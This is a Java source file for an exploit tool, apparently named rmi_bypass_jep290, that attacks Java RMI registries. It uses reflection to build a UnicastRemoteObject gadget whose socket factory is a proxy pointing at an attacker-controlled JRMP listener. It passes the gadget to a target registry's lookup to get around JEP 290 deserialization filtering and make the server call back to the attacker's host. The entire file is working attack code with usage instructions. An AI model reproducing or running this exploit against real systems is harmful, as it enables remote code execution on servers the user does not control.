import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Proxy;
import java.rmi.server.ObjID;
import java.rmi.server.RMIServerSocketFactory;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.rmi.server.UnicastRemoteObject;
import java.util.Random;

public class RMIClient {
    public static void main(String[] args) {
        try {
            if (args.length != 4) {
                System.out.println("Usage: java -jar rmi_bypass_jep290.jar rmi_server_ip rmi_server_port jrmp_listener_ip jrmp_listener_port");
                return;
            }
            String rmiServerHost = args[0];
            int rmiServerPort = Integer.parseInt(args[1]);
            String jrmpHost = args[2];
            int jrmpPort = Integer.parseInt(args[3]);
            My_RegistryImpl_Stub stub = (My_RegistryImpl_Stub) My_LocateRegistry.getRegistry(rmiServerHost,rmiServerPort);
            stub.lookup(stub, RMIClient.getGadget(jrmpHost,jrmpPort));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static UnicastRemoteObject getGadget(String host, int port) throws Exception {

        // 1. Create a new TCPEndpoint and UnicastRef instance.
        // The TCPEndpoint contains the IP/port of the attacker
        // Taken from Moritz Bechlers JRMP Client
        ObjID id = new ObjID(new Random().nextInt()); // RMI registry

        TCPEndpoint te = new TCPEndpoint(host, port);
        UnicastRef refObject = new UnicastRef(new LiveRef(id, te, false));

        // 2. Create a new instance of RemoteObjectInvocationHandler,
        // passing the RemoteRef object (refObject) with the attacker controlled IP/port in the constructor
        RemoteObjectInvocationHandler myInvocationHandler = new RemoteObjectInvocationHandler(refObject);

        // 3. Create a dynamic proxy class that implements the classes/interfaces RMIServerSocketFactory
        // and Remote and passes all incoming calls to the invoke method of the
        // RemoteObjectInvocationHandler
        RMIServerSocketFactory handcraftedSSF = (RMIServerSocketFactory) Proxy.newProxyInstance(
                RMIServerSocketFactory.class.getClassLoader(),
                new Class[] { RMIServerSocketFactory.class, java.rmi.Remote.class },
                myInvocationHandler);

        // 4. Create a new UnicastRemoteObject instance by using Reflection
        // Make the constructor public
        Constructor<?> constructor = UnicastRemoteObject.class.getDeclaredConstructor(null);
        constructor.setAccessible(true);
        UnicastRemoteObject myRemoteObject = (UnicastRemoteObject) constructor.newInstance(null);

        // 5. Make the ssf instance accessible (again by using Reflection) and set it to the proxy object
        Field privateSsfField = UnicastRemoteObject.class.getDeclaredField("ssf");
        privateSsfField.setAccessible(true);

        // 6. Set the ssf instance of the UnicastRemoteObject to our proxy
        privateSsfField.set(myRemoteObject, handcraftedSSF);

        // return the gadget
        return myRemoteObject;
    }
}
